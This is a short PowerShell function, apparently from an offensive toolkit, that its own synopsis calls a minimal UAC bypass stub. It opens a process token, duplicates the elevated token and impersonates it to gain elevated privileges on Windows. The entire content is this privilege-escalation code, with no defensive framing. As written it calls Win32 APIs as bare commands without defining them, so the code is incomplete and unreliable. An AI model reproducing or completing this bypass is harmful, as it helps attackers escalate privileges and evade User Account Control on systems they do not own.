function Invoke-BypassUACTokenManipulation {
<#
.SYNOPSIS
Minimal UAC token-manipulation bypass stub: duplicates the elevated token
with DuplicateTokenEx and impersonates it via ImpersonateLoggedOnUser.
#>
    Param(
        [Int]$ProcessId = 0
    )
    $handle = Open-ProcessToken $ProcessId
    $duplicated = DuplicateTokenEx $handle
    ImpersonateLoggedOnUser $duplicated
}
